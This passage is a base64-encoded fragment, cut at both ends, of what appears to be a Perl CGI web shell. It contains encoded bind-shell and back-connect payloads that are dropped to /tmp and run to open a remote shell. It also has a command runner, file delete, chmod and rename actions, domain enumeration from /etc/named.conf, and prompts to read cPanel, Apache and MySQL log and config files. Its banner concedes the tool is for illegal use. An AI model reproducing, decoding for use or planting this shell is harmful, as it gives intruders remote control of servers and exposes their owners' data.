kZOb1pXeHNJaWs3RFFwamJHOXpaU0JUVDBOTFJWUTciOw0KCSRiaW5kcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1UyOWphMlYwT3cwS0pFRlNSME05UUVGU1IxWTdEUW9rY0c5eWRBazlJQ1JCVWtkV1d6QmRPdzBLSkhCeWIzUnZDVDBnWjJWMGNISnZkRzlpZVc1aGJXVW9KM1JqY0NjcE93MEtKRk5vWld4c0NUMGdJaTlpYVc0dlltRnphQ0k3RFFwemIyTnJaWFFvVTBWU1ZrVlNMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z0pIQnliM1J2S1c5eUlHUnBaU0FpYzI5amEyVjBPaVFoSWpzTkNuTmxkSE52WTJ0dmNIUW9VMFZTVmtWU0xDQlRUMHhmVTA5RFMwVlVMQ0JUVDE5U1JWVlRSVUZFUkZJc0lIQmhZMnNvSW13aUxDQXhLU2x2Y2lCa2FXVWdJbk5sZEhOdlkydHZjSFE2SUNRaElqc05DbUpwYm1Rb1UwVlNWa1ZTTENCemIyTnJZV1JrY2w5cGJpZ2tjRzl5ZEN3Z1NVNUJSRVJTWDBGT1dTa3BiM0lnWkdsbElDSmlhVzVrT2lBa0lTSTdEUXBzYVhOMFpXNG9VMFZTVmtWU0xDQlRUMDFCV0VOUFRrNHBDUWx2Y2lCa2FXVWdJbXhwYzNSbGJqb2dKQ0VpT3cwS1ptOXlLRHNnSkhCaFpHUnlJRDBnWVdOalpYQjBLRU5NU1VWT1ZDd2dVMFZTVmtWU0tUc2dZMnh2YzJVZ1EweEpSVTVVS1EwS2V3MEtDVzl3Wlc0b1UxUkVTVTRzSUNJK0prTk1TVVZPVkNJcE93MEtDVzl3Wlc0b1UxUkVUMVZVTENBaVBpWkRURWxGVGxRaUtUc05DZ2x2Y0dWdUtGTlVSRVZTVWl3Z0lqNG1RMHhKUlU1VUlpazdEUW9KYzNsemRHVnRLQ0oxYm5ObGRDQklTVk5VUmtsTVJUc2dkVzV6WlhRZ1UwRldSVWhKVTFRZ08yVmphRzhnSjFzclhTQlRlWE4wWlcxcGJtWnZPaUFuT3lCMWJtRnRaU0F0WVR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JWYzJWeWFXNW1iem9nSnpzZ2FXUTdaV05vYnp0bFkyaHZJQ2RiSzEwZ1JHbHlaV04wYjNKNU9pQW5PeUJ3ZDJRN1pXTm9ienNnWldOb2J5QW5XeXRkSUZOb1pXeHNPaUFuT3lSVGFHVnNiQ0lwT3cwS0NXTnNiM05sS0ZOVVJFbE9LVHNOQ2dsamJHOXpaU2hUVkVSUFZWUXBPdzBLQ1dOc2IzTmxLRk5VUkVWU1VpazdEUXA5RFFvPSI7DQoNCgkkQ2xpZW50QWRkciA9ICRpbnsnY2xpZW50YWRkcid9Ow0KCSRDbGllbnRQb3J0ID0gaW50KCRpbnsnY2xpZW50cG9ydCd9KTsNCglpZigkQ2xpZW50UG9ydCBlcSAwKQ0KCXsNCgkJcmV0dXJuICZCYWNrQmluZEZvcm07DQoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJhY2twZXJsKTsNCgkJaWYoLXcgIi90bXAvIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmFja2Nvbm5lY3QucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJhY2tjb25uZWN0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRBZGRyICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9ZWxzZQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOw0KCQlpZigtdyAiL3RtcCIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCAkRmlsZSAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyAgQXJyYXkgTGlzdCBEaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSbURpcigkKSANCnsNCglteSAkZGlyID0gc2hpZnQ7DQoJaWYob3BlbmRpcihESVIsJGRpcikpDQoJew0KCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkNCgkJew0KCQkJaWYoKCRmaWxlIG5lICIuIikgJiYgKCRmaWxlIG5lICIuLiIpKQ0KCQkJew0KCQkJCSRmaWxlPSAkZGlyLiRQYXRoU2VwLiRmaWxlOw0KCQkJCWlmKC1kICRmaWxlKQ0KCQkJCXsNCgkJCQkJJlJtRGlyKCRmaWxlKTsNCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJdW5saW5rKCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJY2xvc2VkaXIoRElSKTsNCgl9DQp9DQpzdWIgRmlsZU93bmVyKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZSAkZmlsZSkNCgl7DQoJCSgkdWlkLCRnaWQpID0gKHN0YXQoJGZpbGUpKVs0LDVdOw0KCQlpZigkV2luTlQpDQoJCXsNCgkJCXJldHVybiAiPz8/IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOw0KCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOw0KCQkJcmV0dXJuICRuYW1lLiIvIi4kZ3JvdXA7DQoJCX0NCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIFBhcmVudEZvbGRlcigkKQ0Kew0KCW15ICRwYXRoID0gc2hpZnQ7DQoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOw0KCWNob3AoJHBhdGggPSBgJENvbW1gKTsNCglyZXR1cm4gJHBhdGg7DQp9DQpzdWIgRmlsZVBlcm1zKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglteSAkdXIgPSAiLSI7DQoJbXkgJHV3ID0gIi0iOw0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQlpZigtciAkZmlsZSl7ICR1ciA9ICJyIjsgfQ0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0NCgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsNCgkJfWVsc2UNCgkJew0KCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsNCgkJCSRyZXN1bHQgPSBzcHJpbnRmKCIlMDRvIiwgJG1vZGUgJiAwNzc3Nyk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfQ0KCX0NCglyZXR1cm4gIjAwMDAiOw0KfQ0Kc3ViIEZpbGVMYXN0TW9kaWZpZWQoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOw0KCQkoJGQsJG0sJHksJGgsJGkpID0gKGxvY2FsdGltZSgkbGEpKVszLDQsNSwyLDFdOw0KCQkkeSA9ICR5ICsgMTkwMDsNCgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOw0KCQkkbG10aW1lID0gc3ByaW50ZigiJTAyZC8lcy8lNGQgJTAyZDolMDJkIiwkZCwkbW9udGhbJG1dLCR5LCRoLCRpKTsNCgkJcmV0dXJuICRsbXRpbWU7DQoJfQ0KCXJldHVybiAiPz8/IjsNCn0NCnN1YiBGaWxlU2l6ZSgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWYgJGZpbGUpDQoJew0KCQlyZXR1cm4gLXMgIiRmaWxlIjsNCgl9DQoJcmV0dXJuICIwIjsNCn0NCnN1YiBQYXJzZUZpbGVTaXplKCQpDQp7DQoJbXkgJHNpemUgPSBzaGlmdDsNCglpZigkc2l6ZSA8PSAxMDI0KQ0KCXsNCgkJcmV0dXJuICRzaXplLiAiIEIiOw0KCX0NCgllbHNlDQoJew0KCQlpZigkc2l6ZSA8PSAxMDI0KjEwMjQpIA0KCQl7DQoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMDJmIiwkc2l6ZSAvIDEwMjQpOw0KCQkJcmV0dXJuICRzaXplLiIgS0IiOw0KCQl9DQoJCWVsc2UgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBNQiI7DQoJCX0NCgl9DQp9DQpzdWIgdHJpbSgkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nID1+IHMvXlxzKy8vOw0KCSRzdHJpbmcgPX4gcy9ccyskLy87DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgQWRkU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgVHJpbVNsYXNoZXMoJCkNCnsNCglteSAkc3RyaW5nID0gc2hpZnQ7DQoJJHN0cmluZz1+IHMvXC9cLy9cLy9nOw0KCSRzdHJpbmc9fiBzL1xcXFwvXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAmVHJpbVNsYXNoZXMoJEN1cnJlbnREaXIuJFBhdGhTZXApOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgb25TdWJtaXQ9XCJFbmNvZGVyKCdkJylcIiBhY3Rpb249JyRTY3JpcHRMb2NhdGlvbic+PHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz5QYXRoOiBbICIuJkFkZExpbmtEaXIoImd1aSIpLiIgXSA8L3NwYW4+PGlucHV0IHR5cGU9J3RleHQnIGlkPSdkJyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOw0KCWlmKC1kICRwYXRoKQ0KCXsNCgkJbXkgQGZuYW1lID0gKCk7DQoJCW15IEBkbmFtZSA9ICgpOw0KCQlpZihvcGVuZGlyKERJUiwkcGF0aCkpDQoJCXsNCgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQkJew0KCQkJCSRmPSRwYXRoLiRmaWxlOw0KCQkJCWlmKC1kICRmKQ0KCQkJCXsNCgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQkJY2xvc2VkaXIoRElSKTsNCgkJfQ0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7DQoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsNCgkJJHJlc3VsdCAuPSAiPGRpdj48dGFibGUgd2lkdGg9JzkwJScgY2xhc3M9J2xpc3RkaXInPg0KCQk8dHIgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6ICMzZTNlM2UnPjx0aD5GaWxlIE5hbWU8L3RoPg0KCQk8dGggd2lkdGg9JzEwMCc+RmlsZSBTaXplPC90aD4NCgkJPHRoIHdpZHRoPScxNTAnPk93bmVyPC90aD4NCgkJPHRoIHdpZHRoPScxMDAnPlBlcm1pc3Npb248L3RoPg0KCQk8dGggd2lkdGg9JzE1MCc+TGFzdCBNb2RpZmllZDwvdGg+DQoJCTx0aCB3aWR0aD0nMjMwJz5BY3Rpb248L3RoPjwvdHI+IjsNCgkJbXkgJHN0eWxlPSJub3RsaW5lIjsNCgkJbXkgJGk9MDsNCgkJZm9yZWFjaCBteSAkZCAoQGRuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGQgPSAmdHJpbSgkZCk7DQoJCQkkZGlybmFtZT0kZDsNCgkJCWlmKCRkIGVxICIuLiIpIA0KCQkJew0KCQkJCSRkID0gJlBhcmVudEZvbGRlcigkcGF0aCk7DQoJCQl9DQoJCQllbHNpZigkZCBlcSAiLiIpIA0KCQkJew0KCQkJCW5leHQ7DQoJCQl9DQoJCQllbHNlIA0KCQkJew0KCQkJCSRkID0gJHBhdGguJGQ7DQoJCQl9DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBjbGFzcz0nZGlyJz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRkKS4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mRmlsZU93bmVyKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD48YSBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRkaXJuYW1lJywnIi4mQWRkU2xhc2hlcygmQWRkU2xhc2hlcygkZCkpLiInKTsgcmV0dXJuIGZhbHNlOyBcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJnJlbW92ZT0kZGlybmFtZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGU9JGY7DQoJCQkkZiA9ICRwYXRoLiRmOw0KCQkJbXkgJGFjdGlvbiA9IGVuY29kZV9iYXNlNjQoImVkaXQgIi4kZmlsZSk7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBjbGFzcz0nZmlsZSc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJkVuY29kZURpcigkcGF0aCkuIiZjPSIuJGFjdGlvbi4iJz4iLiRmaWxlLiI8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZikuIicsJyIuJGZpbGUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCRpLCckZmlsZScpXCIgPiIuJkZpbGVQZXJtcygkZikuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD48YSBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRmaWxlJywnZicpOyByZXR1cm4gZmFsc2U7XCI+UmVuYW1lPC9hPiB8IDxhIGhyZWY9Jz9hPWRvd25sb2FkJm89Z28mZj0iLiRmLiInPkRvd25sb2FkPC9hPiB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGZpbGU6ICRmaWxlID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSIuJkVuY29kZURpcigkcGF0aCkuIiZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRyeSB0byBWaWV3IExpc3QgVXNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdEb21haW5Vc2VyDQp7DQoJb3BlbiAoZDBtYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCglteSBAY256cyA9IDxkMG1haW5zPjsNCgljbG9zZSBkMG1haW5zOw0KCW15ICRzdHlsZT0ibGluZSI7DQoJbXkgJHJlc3VsdD0iPGgzPjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz4hIVNoZWxsIGlzIGRldmVsb3BlZCBieSBBa2FzaGlKaXJvIGJ1dCBJIHdvbid0IHRha2UgYW55IHJlc3BvbnNpYmxlIGZvciB1c2luZyB0aGlzIGlsbGVnYWwhISE8L2ZvbnQ+PC9oMz4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5LaG9uZyB0aGUgYnlwYXNzIGR1b2M8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGUgaWQ9ImRvbWFpbiI+PHRyPjx0aD5kMG1haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSB0cmltKCIvZXRjL3ZhbGlhc2VzLyIuJDEpOw0KCQkJJG93bmVyID0gZ2V0cHd1aWQoKHN0YXQoJGZpbGVuYW1lKSlbNF0pOw0KCQkJJHJlc3VsdCAuPSAnPHRyIHN0eWxlPSIkc3R5bGUiIHdpZHRoPTUwJT48dGQ+PGEgaHJlZj0iaHR0cDovLycuJDEuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJDEuJzwvYT48L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7DQoJfQ0KCW15ICRyZXN1bHQ9Ijx0YWJsZT48dHI+PHRoPlBhdGggTG9nPC90aD48dGg+U3VibWl0PC90aD48L3RyPiI7DQoJbXkgQHBhdGhsb2c9KAknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9hcGFjaGUyL2NvbmYvaHR0cGQuY29uZicsDQoJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCScvdmFyL2xvZy9odHRwZC9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2Vycm9yX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL3N1cGhwX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbGljZW5zZV9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbG9naW5fbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL3N0YXRzX2xvZycsDQoJCQknL3Zhci9jcGFuZWwvY3BhbmVsLmNvbmZpZycsDQoJCQknL3Vzci9sb2NhbC9waHAvbGliL3BocC5pbmknLA0KCQkJJy91c3IvbG9jYWwvcGhwNS9saWIvcGhwLmluaScsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtYmluLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwubG9nJywNCgkJCScvdmFyL2xvZy9teXNxbGRlcnJvci5sb2cnLA0KCQkJJy92YXIvbG9nL215c3FsL215c3FsLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtc2xvdy5sb2cnLA0KCQkJJy92YXIvbXlzcWwubG9nJywNCgkJCScvdmFyL2xpYi9teXNxbC9teS5jbmYnLA0KCQkJJy9ldGMvbXlzcWwvbXkuY25mJywNCgkJCScvZXRjL215LmNuZicsDQoJCQkpOw0KCW15ICRpPTA7DQoJbXkgJHBlcm1zOw0KCW15ICRzbDsNCglmb3JlYWNoIG15ICRsb2cgKEBwYXRobG9nKQ0KCXsNCgkJaWYoLXIgJGxvZykNCgkJew0KCQkJJHBlcm1zPSJPSyI7DQoJCX1lbHNlDQoJCXsNCgkJCSRwZXJtcz0iPGZvbnQgc3R5bGU9J2NvbG9yOiByZWQ7Jz5DYW5jZWw8Zm9udD4iOw0KCQl9DQoJCSRyZXN1bHQgLj08PEVORDsNCgkJPHRyPg0KDQoJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBvblN1Ym1pdD0iRW5jb2RlcignbG9nJGknKSI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIGlkPSJsb2ckaSIgbmFtZT0iYyIgdmFsdWU9InRhaWwgLTEwMDAwICRsb2cgfCBncmVwICcvaG9tZSciIHNpemU9JzUwJy8+PC90ZD4NCgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciIgLz4NCgkJCTwvZm9ybT4NCgkJCTx0ZD4kcGVybXM8L3RkPg0KDQoJCTwvdHI+DQpFTkQNCgkJJGkrKzsNCgl9DQoJJHJlc3VsdCAuPSI8L3RhYmxlPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gZGVjb2RlX2Jhc2U2NCgkaW57J2MnfSk7DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KDQokQWN0aW9uID0gImNvbW1hbmQiIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKGRlY29kZV9iYXNlNjQodHJpbSgkaW57J2QnfSkpKTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob21wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcigiZCIpOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCRjaG1vZCBuZSAwKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ